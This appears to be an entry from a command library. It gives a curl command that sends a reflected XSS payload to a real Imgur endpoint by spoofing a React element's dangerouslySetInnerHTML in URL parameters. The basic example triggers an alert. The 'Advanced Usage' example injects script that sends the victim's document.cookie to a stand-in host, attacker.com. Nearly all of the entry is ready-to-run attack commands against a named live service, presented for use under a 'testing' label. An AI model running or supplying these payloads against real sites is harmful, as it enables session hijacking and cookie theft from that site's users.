---
data: >-
  curl
  "http://imgur.com/vidgif/ticket/aaaaaaaa?error[props][dangerouslySetInnerHTML][__html]=%3Cimg%20src=a%20onerror=%22alert(%27XSS%20on%20%27%2bdocument.domain)%22%3E&error[_isReactElement]=true&error[type]=body"
  -v
tags:
  - xss
  - web
  - testing
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 8b1ce321-ce98-44dc-b299-5ec72841bb29
created_at: '2025-12-14T03:16:07.976Z'
updated_at: '2025-12-14T03:16:07.976Z'
verified: false
validated: true
submitted: true
---
# curl-imgur-xss-payload

## Command

```bash
curl "http://imgur.com/vidgif/ticket/aaaaaaaa?error[props][dangerouslySetInnerHTML][__html]=%3Cimg%20src=a%20onerror=%22alert(%27XSS%20on%20%27%2bdocument.domain)%22%3E&error[_isReactElement]=true&error[type]=body" -v
```

## Description

This command uses curl to send a GET request to Imgur's vulnerable endpoint with parameters that spoof a React element, testing for XSS by attempting to inject a JavaScript payload. The -v flag provides verbose output for debugging the HTTP interaction. Use this to verify the vulnerability without full browser execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The full malicious URL with encoded payload | Yes |
| -v, --verbose | Enable verbose output to see request/response details | No |

## Examples

### Basic Usage

```bash
curl "http://imgur.com/vidgif/ticket/aaaaaaaa?error[props][dangerouslySetInnerHTML][__html]=%3Cimg%20src=a%20onerror=%22alert(%27XSS%20on%20%27%2bdocument.domain)%22%3E&error[_isReactElement]=true&error[type]=body" -v
```

### Advanced Usage

```bash
curl -H "Cookie: IMGURSESSION=testsession" "http://imgur.com/vidgif/ticket/aaaaaaaa?error[props][dangerouslySetInnerHTML][__html]=%3Cimg%20src=a%20onerror=%22fetch(%27http://attacker.com?cookie=%27+document.cookie)%22%3E&error[_isReactElement]=true&error[type]=body" -v
```

## Expected Output

Verbose HTTP request/response, including the server's error page HTML in the body. Look for the injected <img> tag in the response, indicating the payload was processed. Full JS execution (e.g., alert) only occurs in a browser; curl shows the render attempt.

## Related

- [[Related Procedure]]
